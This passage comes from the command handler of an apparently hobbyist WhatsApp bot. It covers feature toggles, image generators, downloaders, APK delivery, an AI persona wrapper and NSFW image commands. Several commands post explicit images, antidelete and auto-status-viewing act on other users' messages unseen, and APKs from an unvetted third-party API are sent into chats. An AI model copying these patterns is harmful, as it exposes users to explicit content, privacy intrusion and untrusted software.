                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.anticall = true; // Enable auto react
                        await reply('`Successfully Activated Anticall.`');
                    } else if (args[0] === 'off') {
                        global.anticall = false; // Disable auto react
                        await reply('`Successfully Deactivated Anticall.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Anticall.\``);
                    }
                    break;
                }
                case 'autotyping': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.autotyping = true; // Enable auto react
                        await reply('`Successfully Activated Autotyping.`');
                    } else if (args[0] === 'off') {
                        global.autotyping = false; // Disable auto react
                        await reply('`Successfully Deactivated Autotyping.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Anticall.\``);
                    }
                    break;
                }
 case 'antidelete': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.antidelete = true; // Enable auto react
                        await reply('`Successfully Activated Antidelete.`');
                    } else if (args[0] === 'off') {
                        global.antidelete = false; // Disable auto react
                        await reply('`Successfully Deactivated Antidelete.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Antidelete.\``);
                    }
                    break;
                }
                case 'alwaysonline': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.alwaysonline = true; // Enable auto react
                        await reply('`Successfully Activated Alwaysonline.`');
                    } else if (args[0] === 'off') {
                        global.alwaysonline = false; // Disable auto react
                        await reply('`Successfully Deactivated Alwaysonline.`');
                    } else {
                        return reply(`\`Invalid option. Use "on" or "off" to toggle Alwaysonline.\``);
                    }
                    break;
                }
                case 'caption': {
                    reply(`🫤`)
                }
                break
                case 'blackpink': {
                    try {
                        await loading();

                        // Fetch the list of image URLs from the provided URL
                        const response = await fetch('https://raw.githubusercontent.com/arivpn/dbase/master/kpop/blekping.txt');
                        const textData = await response.text();

                        // Split the text into an array of URLs
                        const urls = textData.split('\n').filter(Boolean);

                        // Pick a random image URL
                        const randomImage = urls[Math.floor(Math.random() * urls.length)];

                        // Send the random image to the chat
                        await conn.sendMessage(m.chat, {
                            image: {
                                url: randomImage
                            },
                            caption: font(`Random Blackpink image\n> ${caption}`)
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error('Error fetching Blackpink images:', error);
                        reply('Sorry, an error occurred while fetching the Blackpink images.');
                    }
                    break;
                }
case 'invite': {
    if (!isGroup) return reply(mess.only.group);
    if (!isBotGroupAdmins) return reply(mess.only.Badmin);
    if (!text) return reply(`\`No WhatsApp number detected.\`\n*Example: ${prefix + command} 255734980103*`);
    if (text.includes('+')) return reply(`\`Input the WhatsApp number without *+*\``);
    if (isNaN(text)) return reply(`Please enter only numbers, including your country code, without spaces.`);

    let group = m.chat;

    try {
        // Generate the group invite link
        let link = 'https://chat.whatsapp.com/' + await conn.groupInviteCode(group);
        await conn.sendMessage(`${text}@s.whatsapp.net`, {
            text: ` *𝙂𝙍𝙊𝙐𝙋 𝙄𝙉𝙑𝙄𝙏𝘼𝙏𝙄𝙊𝙉 𝙇𝙄𝙉𝙆*\n*\`𝚈𝙾𝚄 𝙰𝚁𝙴 𝙸𝙽𝚅𝙸𝚃𝙴𝙳 𝚃𝙾 𝙹𝙾𝙸𝙽: ${groupMetadata.subject}\`*\n*𝙻𝙸𝙽𝙺:* ${link}\n> ${caption}`
        });

        reply("*Group invitation link successfully sent.*");
    } catch (error) {
        console.error("Error in invite case:", error);
        reply("Failed to send the invite link. Please check the number and try again.");
    }

    break;
}
case 'glitchtext':
case 'writetext':
case 'advancedglow':
case 'typographytext':
case 'pixelglitch':
case 'neonglitch':
case 'flagtext':
case 'flag3dtext':
case 'deletingtext':
case 'blackpinkstyle':
case 'glowingtext':
case 'underwatertext':
case 'logomaker':
case 'cartoonstyle':
case 'papercutstyle':
case 'watercolortext':
case 'effectclouds':
case 'blackpinklogo':
case 'gradienttext':
case 'summerbeach':
case 'luxurygold':
case 'multicoloredneon':
case 'sandsummer':
case 'galaxywallpaper':
case '1917style':
case 'makingneon':
case 'royaltext':
case 'freecreate':
case 'galaxystyle':
case 'lighteffects':{
if (!q) return reply(`\`No Text detected\`\n*Example : ${prefix+command} Blue demon*`) 
await loading()
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
conn.sendMessage(m.chat, { image: { url: haldwhd }, caption: fontx(`> ${caption}`)}, { quoted: m })
}
break

case 'autostatus':
case 'avs':
case 'autoviewstatus': {
    if (!isOwner) return reply(mess.only.owner); 
    if (!args[0]) return reply(`Example: ${prefix + command} on/off`);

    if (args[0].toLowerCase() === 'on') {
        global.autoswview = true;
        reply('Successfully Activated Autoviewstatus.');
    } else if (args[0].toLowerCase() === 'off') {
        global.autoswview = false;
        reply('Successfully Deactivated Autoviewstatus.');
    } else {
        reply('Invalid option. Use "on" or "off" to toggle Autoviewstatus.');
    }
    break;
}
setInterval(autoViewStatus, 5000); 
case 'playstore': {
    if (!q) return reply(`\`No search term detected\`\n*Example:  ${prefix + command} Freefire*`);
    await loading();

    try {
        const response = await fetchJson(`https://api-lenwy.vercel.app/playstore?search=${encodeURIComponent(q)}`);
        const data = response.data;

        if (!data || data.length === 0) {
            return reply("No results found for this search term.");
        }

        // Prepare the message with search results
        let message = `*[ PLAY STORE SEARCH RESULTS ]*\n> ${fontx(caption)}`;

        // Loop through the first 2 results and format the message
        for (let i = 0; i < Math.min(2, data.length); i++) {
            const app = data[i];
            message += `*App Name*: _${app.nama}_
*Developer*: _${app.developer}_
*Rating*: _${app.rate}_
*Link*: ${app.link}

*Developer's Link*: ${app.link_dev}
_______________________\n`;
        }

        // Send the image with the results as the caption
        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/playstore.jpg' // Local image path
            },
            caption: message,
        }, { quoted: m });

    } catch (err) {
        console.error("Error fetching Play Store data:", err);
        reply("Error fetching the search results. Please try again.");
    }

    break;
}
                case 'infogc':
                case 'gcinfo': {
                    if (!isGroup) return reply(mess.only.group)
                    await loading()
                    let _meta = await conn.groupMetadata(from)
                    console.log(_meta)
                    let _img = await conn.profilePictureUrl(_meta.id, 'image')

                    let caption = `*G R O U P I N F O*


Anti Link : *${isAntiLink ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti Virtex : *${isAntiVirtex ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti Delete : *${isAntidelete ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti ViewOnce : *${isAntiViewOnce ? 'ACTIVE✅' : 'UNACTIVE❌'}*
Anti Toxic : *${isAntiToxic ? 'ACTIVE✅' : 'UNACTIVE❌'}*


⭓ *Name :* ${_meta.subject}
⭓ *Group ID :* ${_meta.id}
⭓ *Created on :* ${moment(_meta.creation * 1000).format('ll')}
⭓ *GC owner:* ${_meta.subjectOwner}
⭓ *Admins length:* ${_meta.participants.filter(x => x.admin === 'admin').length}
⭓ *participants length:* ${_meta.participants.filter(x => x.admin === null).length}
⭓ *Desc :* 
${_meta.desc}`

                    await conn.sendMessage(from, {
                        caption,
                        image: await getBuffer(_img)
                    }, {
                        quoted: fcall
                    })
                }
                break
case 'waifu' :
case 'neko' :
case 'trap' :
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
 let trap = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url:trap.data.url } }, { quoted: m })
break

case 'animespank':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
let waifud = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await conn.sendMessage(m.chat, { caption:  `> ${caption}`, image: {url:waifud.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'gifblowjob':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await conn.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'blowjob':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'cuckold':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'eba':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'pussy':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'yuri':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'zettai':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'foot':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/foot.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption: fontx(`> ${caption}`), image: { url: xeonyresult.url } }, { quoted: m })
break
case 'milf':
if(!isGroup) return reply(mess.only.group)
if (!isAntiNsfw) return reply(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./temp/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
conn.sendMessage(m.chat, { caption:`> ${caption}`, image: { url: xeonyresult.url } }, { quoted: m })
break
case 'nsfw':{
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
               if (args.length < 1) return reply('*Enable or disable? Use: ᴏɴ/ᴏꜰꜰ*')
               if (args[0] === 'on') {
                  db.data.chats[from].nsfw = true
                  reply(`*\`${command} has been enabled in this group\`*`)
       let warning = fontx(` 
  *「 ⚠️ 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 ⚠️ 」*\nThe NSFW (Not Safe For Work) feature has been activated in this group. As a result, explicit content may be accessible through the bot. Please proceed with caution and ensure compliance with community guidelines.
`)
    m.reply(warning)
               } else if (args[0] === 'off') {
                  db.data.chats[from].nsfw = false
 reply(`*\`${command} has been disabled in this group\`*`)
               }
               }
            break
case 'aza': 
case 'pay': 
case 'acc': {
    reply(
        `💳 *Banking Details* 💳\n\n🏦 *Bank Name:* *${bank}*\n🔢 *Acc Number:* *${accnumber}*\n👤 *Acc Name:* *${bankname}*`
    );
    break;
}
case 'blueai': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
    const prompt = "You are BLUE AI, an advanced artificial intelligence model developed by BLUE DEMON for the BLUEXDEMON-V5 project. As BLUE AI Version 4, you are designed to provide insightful and accurate responses. Your purpose is to assist users with a wide range of tasks and queries effectively,from now on u are Branded by this. Question: ";
        // Construct API URL
        const apiUrl = `https://api-lenwy.vercel.app/ai4chat?text=${encodeURIComponent(prompt)}${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (res.status !== 200 || !res.data) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.data;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/thumb.jpg', // Path to ChatGPT image
            },
            caption: fontx(`*BLUE AI Response:*\n${aiResponse}\n> ${caption}`),
        }, { quoted: m });

    } catch (error) {
        console.error("Error in BLUE Ai case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }

    break;
}
case 'quote': {
    try {
        await loading();
        let res = await fetch(`https://api-x-demon-dev.hf.space/api/quote`);
        let json = await res.json();
        if (json.status !== 200 || !json.quote) {
            return reply("Failed to fetch a quote. Please try again later.");
        }
        await reply(`📝 *Quote:* \n\n${json.quote}\n - ${json.Author}`);
    } catch (error) {
        console.error("Error in quote case:", error);
        reply("An error occurred while fetching a quote. Please try again later.");
    }
    break;
}
case 'all-in-one': case 'facebook2': case 'tiktok2': case 'Instagram2': case 'fb': case 'instagram': case 'ig': {
    if (!q) {
        return reply(`*\`Please provide a URL.\`*\n*Example: ${prefix + command} link*`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/download/alldownload?url=${encodeURIComponent(q)}`;

        // Fetch data from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract high-quality video URL
        const { title, high } = res.BK9;

        // Send the high-quality video
        await conn.sendMessage(from, {
            video: { url: high },
            caption: fontx(`🎥 *${title}*\n\n> ${caption}`),
        }, { quoted: m });

    } catch (error) {
        console.error("Error in all-in-one case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'apkfab': {
    if (!q) {
        return reply(`*\`Please provide an APK URL.\`*\n*Example: ${prefix + command} apkfab-link*`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/apkfab?url=${encodeURIComponent(q)}`;

        // Fetch APK details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch APK details. Please try again later.");
        }

        // Extract APK details
        const { title, link, size } = res.BK9;

        // Send APK details
        await conn.sendMessage(m.chat, {
            text: fontx(`🖥️ *APK Details:*\n\n📌 *Title: ${title}*\n📦 *Size:* ${size || 'Unknown'}\nMay take few minutes🔃\n> ${caption}`),
        }, { quoted: m });

        // Send APK file after initial message
        await conn.sendMessage(m.chat, {
            document: { url: link },
            mimetype: "application/octet-stream",
            fileName: `${title}.apk`,
            caption: `📥 *APK Download: ${title}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error in APKFab case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'apk': case 'app': {
    if (!q) {
        return reply(`*\`No apk name detected.\`*\n*Example: ${prefix + command} Facebook*`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/apk?id=${encodeURIComponent(q)}`;

        // Fetch APK details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch APK details. Please try again later.");
        }

        // Extract APK details
        const { name, lastup, icon, dllink } = res.BK9;

        // Send APK icon and details
        await conn.sendMessage(m.chat, {
            image: { url: icon },  // Send the APK icon
            caption: fontx(`📱 *APK Details:*\n\n📌 *Name:* ${name}\n📅 *Last Updated:* ${lastup}\n🆔 *Package:* com.${q}\n\n> ${caption}`),
        }, { quoted: m });

        // Send APK file as a download
        await conn.sendMessage(m.chat, {
            document: { url: dllink },
            mimetype: "application/octet-stream",
            fileName: `${name}.apk`,
            caption: `📥 *APK Download: ${name}*`
        }, { quoted: m });

    } catch (error) {
        console.error("Error in APK case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'twitter': {
    if (!q) {
        return reply(`*No Twitter URL detected.*\n\n*Example: ${prefix + command} link*`);
    }

    try {
        await loading();

        // Construct API URL
        const apiUrl = `https://bk9.fun/download/twitter?url=${encodeURIComponent(q)}`;

        // Fetch Twitter details from the API
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch Twitter video. Please try again later.");
        }

        // Extract Twitter video details
        const { HD, username, thumbnail } = res.BK9;

        // Send the Twitter video with details
        await conn.sendMessage(m.chat, {
            video: { url: HD },  // Send the HD video URL
            caption: `🐦 *Twitter Video Details:*\n\n👤 *Username:* ${username}\n\n> ${caption}`,
            thumbnail: { url: thumbnail }, // Set the video thumbnail
        }, { quoted: m });

    } catch (error) {
        console.error("Error in Twitter case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'tts': case 'say': {
    if (!q) {
        return reply(`\`Please provide text to convert to speech.\`\n\n*Example:*\n${prefix + command} hello`);
    }

    try {
        await loading();

        // Construct the API URL with the query and language
        const apiUrl = `https://bk9.fun/tools/tts?q=${encodeURIComponent(q)}&lang=en`;
        const response = await fetch(apiUrl);

        // Validate the API response
        if (!response.ok) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Prepare the TTS audio file
        await conn.sendMessage(from, {
            audio: { url: apiUrl }, 
            mimetype: "audio/mp4",
            fileName: `tts_${Date.now()}.mp3`,
            ptt: true, // Send as a voice note
        }, { quoted: m });

    } catch (error) {
        console.error("Error in TTS case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
global.badword = false
   case 'antibadword': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner

                    if (!args[0]) return reply(`Example: ${prefix + command} on/off`); // If no argument provided

                    if (args[0] === 'on') {
                        global.badword = true; // Enable auto react
                        await reply('Successfully Activated antibadword.');
                    } else if (args[0] === 'off') {
                        global.badword = false; // Disable auto react
                        await reply('Successfully Deactivated antibadword.');
                    } else {
                        return reply(`Invalid option. Use "on" or "off" to toggle antibadword.`);
                    }
                    break;
                }
case 'shortlink': {
    if (!q || !q.includes("|")) {
        return reply("Please provide a URL and an alias in the format: `.shortlink <link> | <alias>`");
    }

    const [url, alias] = q.split("|").map(item => item.trim()); // Split and trim inputs

    if (!url.startsWith("http://") && !url.startsWith("https://")) {
        return reply("Invalid URL format. Please provide a valid URL starting with http:// or https://.");
    }

    if (!alias) {
        return reply("Please provide a valid alias.");
    }

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://bk9.fun/tools/shortlink?url=${encodeURIComponent(url)}&alias=${encodeURIComponent(alias)}`;

        // Fetch the shortlink
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate the API response
        if (!res.status || !res.BK9) {
            return reply("Failed to shorten the URL. Please try again later.");
        }

        // Send the shortened link
        replyx(`*Shortened Link:*\n${res.BK9}\n> ${caption}`);
    } catch (error) {
        console.error("Error in shortlink case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'brave': {
    if (!q) return reply("Please provide a search query.");
    
    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://api.siputzx.my.id/api/s/brave?query=${encodeURIComponent(q)}`;

        // Fetch the search results
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate the API response
        if (!res.status || !res.data || !res.data.results) {
            return reply("No results found for your query. Please try again later.");
        }

        const { results } = res.data;
        const maxResults = 5; // Limit the number of results sent

        // Prepare the formatted message
        let message = `🔍 *Brave Search Results for:* "${q}"\n\n`;
        results.slice(0, maxResults).forEach((item, index) => {
            message += `*${index + 1}. ${item.title}*\n_${item.siteName}_ | ${item.date || "Unknown"}\n${item.description}\n\n`;
        });

        message += `> ${caption}\n`;

        // Send the image with the caption
        await conn.sendMessage(m.chat, {
            image: {
                url: './temp/blueimages/brave.jpg', // Local image path
            },
            caption: message,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in brave case:", error);
        reply("An error occurred while fetching the search results. Please try again later.");
    }
    break;
}
case 'bing': {
    if (!q) return reply("Please provide a search query.");

    try {
        await loading();

        // Construct the API URL
        const apiUrl = `https://api.siputzx.my.id/api/s/bimg?query=${encodeURIComponent(q)}`;

        // Fetch the image search results
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate the API response
        if (!res.status || !res.data || res.data.length === 0) {
            return reply("No images found for your query. Please try again later.");
        }
        const imageUrl = res.data[0];
        await conn.sendMessage(from, {
            image: { url: imageUrl },
            caption: fontx(`🔎 *bing Image Search Results for:* "${q}"\n> ${caption}`),
        });

    } catch (error) {
        console.error("Error in bing case:", error);
        reply("An error occurred while fetching the images. Please try again later.");
    }
    break;
}
case 'cecan-indo': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/indonesia`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return reply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: fontx(`🌸 *Here's a random Indonesian Cecan image for you!*\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecan case:", error);
        reply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-china': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/china`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return reply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: fontx(`🌸 *Here's a random Chinese Cecan image for you!*\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecanchina case:", error);
        reply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-japan': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/japan`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return reply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: fontx(`🎌 *Here's a random Japanese Cecan image for you!*\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecanjapan case:", error);
        reply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-korea': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/korea`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return reply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: fontx(`🇰🇷 *Here's a random Korean Cecan image for you!*\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecankorea case:", error);
        reply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-thai': {
    try {
        await loading();

        // Fetch the image from the API
        const apiUrl = `https://api.siputzx.my.id/api/r/cecan/thailand`;
        const response = await fetch(apiUrl);
        const imageBuffer = await response.buffer();

        // Validate the response
        if (!response.ok || !imageBuffer) {
            return reply("Failed to fetch the image. Please try again later.");
        }

        // Send the image
        await conn.sendMessage(m.chat, {
            image: imageBuffer,
            caption: fontx(`🇹🇭 *Here's a random Thai Cecan image for you!*\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in cecanThailand case:", error);
        reply("An error occurred while fetching the image. Please try again later.");
    }
    break;
}
case 'cecan-mal': {
    try {
        await loading();

        const apiUrl = 'https://api.agatz.xyz/api/malaysia';
        const response = await fetch(apiUrl);
        const res = await response.json();

        if (res.status !== 200 || !res.data?.url) {
            return reply("Failed to fetch the Cecan image. Please try again later.");
        }

        await conn.sendMessage(from, {
            image: { url: res.data.url },
            caption: fontx(`*Here is a Cecan from Malaysia 🇲🇾*\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Cecan Malaysia case:", error);
        reply("An error occurred while fetching the Cecan image. Please try again later.");
    }
    break;
}
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
